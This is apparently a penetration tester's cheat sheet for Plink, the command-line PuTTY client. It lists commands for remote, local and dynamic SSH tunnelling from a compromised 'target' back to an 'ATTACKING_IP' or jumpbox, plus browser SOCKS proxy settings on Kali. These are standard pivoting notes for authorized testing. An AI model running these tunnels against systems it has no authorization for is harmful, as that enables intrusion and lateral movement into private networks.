# Plink

## It's a windows command line version of the PuTTY SSH client.

### Remote port forward via hostkey of jumpbox

## Requirements: Read the public key of the host

    cat /etc/ssh/ssh_host_ed25519_key.pub

## Then on target

    .\plink.exe -ssh -l USER -pw PASSWORD -R 1433:127.0.0.1:1433 -hostkey KEY_SIGNATURE JUMPBOX_IP

### 

    cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N

### Convert keys with puttygen for Plink: 

    puttygen KEY -o KEY.ppk

## Local SSH Tunneling 

    plink.exe -L PORT:TARGET_IP:TARGET_PORT USER@VICTIM_IP

### Then browse to: 

    127.0.0.1:PORT

## Dynamic SSH Tunneling

    plink.exe -D PORT USER@VICTIM_IP (Execute on target)

### Then configure connections from Kali machine 

#### 1) Open browser, then Connection Settings

#### 2) Manual Proxy configuration

#### 3) SOCKS Host 127.0.0.1 port PORT

#### 4) SOCKSv5 button

#### 5) No proxy for: 127.0.0.1

#### 6) Browse to TARGET_IP

## Alternate method: Proxychains
